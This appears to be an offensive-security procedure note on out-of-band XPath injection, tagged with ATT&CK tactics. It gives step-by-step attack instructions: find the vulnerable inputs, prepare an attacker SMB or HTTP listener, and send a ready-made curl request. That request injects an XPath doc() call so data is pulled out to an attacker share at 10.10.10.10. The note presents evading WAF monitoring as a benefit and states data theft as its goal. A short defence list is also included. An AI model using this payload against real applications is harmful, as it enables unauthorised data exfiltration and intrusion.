---
id: c0f418a3-33dd-417a-9097-d0d8727a7266
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:41.431564+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Command and Control|TA0011]]'
  - '[[tactics/Defense Evasion|TA0005]]'
  - '[[tactics/Execution|TA0002]]'
techniques:
  - '[[techniques/Data Encoding|T1132]]'
  - '[[techniques/Data Obfuscation|T1001]]'
  - '[[techniques/XSL Script Processing|T1220]]'
sub_techniques: []
tags:
  - '[[tags/Out Of Band Exploitation]]'
  - '[[tags/XPATH Injection]]'
commands:
  - '[[commands/curl-send-xpath-oob-payload]]'
platforms:
  - Web
tools:
  - '[[tools/Burp-Suite]]'
  - '[[tools/OWASP-ZAP]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
validated: true
---

# Out-of-Band-XPath-Injection

## Summary

Out-of-Band XPath Injection exploits vulnerabilities in web applications that construct XPath queries from user-supplied input without proper sanitization. By injecting malicious XPath expressions, attackers can force the application to load external documents via functions like doc(), enabling data exfiltration over an out-of-band channel such as SMB or HTTP, bypassing inline response monitoring and detection.

## Description

XPath Injection targets XML-based data retrieval in web applications, similar to SQL Injection but for XPath queries. Vulnerable applications often use user input directly in XPath expressions to query XML documents, such as in search or authentication features. An out-of-band variant uses XPath's doc() function to fetch resources from an attacker-controlled server, exfiltrating sensitive data (e.g., user credentials, configuration files) without embedding it in the HTTP response. This technique evades web application firewalls (WAFs) that inspect responses, as data flows separately. It is effective against filtered inputs by leveraging external loading to execute arbitrary data pulls. The target environment is typically web applications using XML/XPath on servers like Apache with libxml or .NET XML parsers. Success allows data theft, system access, or further attacks like privilege escalation.

## Requirements

1. Network access to the target web application (e.g., authenticated or public endpoint).
2. Knowledge of XPath syntax and the application's XML structure (e.g., via error messages or reconnaissance).
3. Attacker-controlled out-of-band server (e.g., SMB share at 10.10.10.10 or HTTP server) to receive exfiltrated data.
4. Tools like [[tools/Burp-Suite]] or [[tools/OWASP-ZAP]] for request interception and modification, or curl for testing.

## Defense

- Implement strict input validation and sanitization, escaping special XPath characters (e.g., ', ", /, //).
- Use parameterized XPath queries or XML APIs that separate code from data (e.g., XmlDocument.SelectNodes with parameters).
- Disable or restrict doc() and similar external loading functions in the XML processor.
- Monitor outbound network traffic for unusual connections to attacker IPs (e.g., SMB to unexpected hosts) using network intrusion detection systems (NIDS).
- Enable web application logging for XPath errors and anomalous query patterns.

## Objectives

1. Identify and confirm XPath injection vulnerability in user inputs.
2. Exfiltrate sensitive XML data via out-of-band channel to an attacker server.
3. Use exfiltrated data for further attacks, such as authentication bypass or data theft.

## Instructions

### Step 1: Identify Vulnerable XPath Endpoint

**Context**: Probe the target application to find inputs (e.g., search fields, login forms) that influence XPath queries. Look for XML-related errors or behaviors indicating XPath usage, such as search results from XML backends.

Use [[tools/Burp-Suite]] or [[tools/OWASP-ZAP]] to intercept and fuzz inputs with single quotes (') or double quotes (") to trigger syntax errors, confirming XPath processing.

**Expected Output**: Error messages like "XPath syntax error" or unexpected application behavior (e.g., no results or partial data leakage).

### Step 2: Craft Out-of-Band Injection Payload

**Context**: Construct a payload that closes the original XPath expression and appends a doc() call to load an external resource from your controlled server. This forces the server to connect outbound, sending XML data to your listener. Replace placeholders with target-specific values; the example uses a search parameter vulnerable to injection.

Prepare an SMB share or HTTP server on your machine (e.g., at 10.10.10.10) to capture incoming requests containing exfiltrated data.

### Step 3: Send Injection Request and Monitor Exfiltration

**Context**: Deliver the payload via HTTP request to trigger the out-of-band fetch. Monitor your listener for incoming connections carrying the stolen data.

**Command** ([[commands/curl-send-xpath-oob-payload]]):
```bash
curl -X GET "http://target.com/search?title=Foundation&type=*&rent_days=*' and doc('file:///\\10.10.10.10\SHARE\exfil.xml')" -v
```

> This command sends a GET request with an injected XPath payload. The single quote (') closes the string in the original query (e.g., title='Foundation'), and the doc() function loads an external XML file from the attacker's SMB share, potentially embedding query results or system data in the request to the share. The -v flag provides verbose output for debugging. Adjust the URL and payload based on the vulnerable parameter.

**Expected Output**: HTTP 200 OK or application response (may not show exfiltration directly); verbose curl output confirms request transmission.

**Success Indicators**:
- Incoming connection to your SMB/HTTP listener from the target server.
- Captured data in the listener logs containing XML snippets or sensitive information (e.g., user lists, configs).
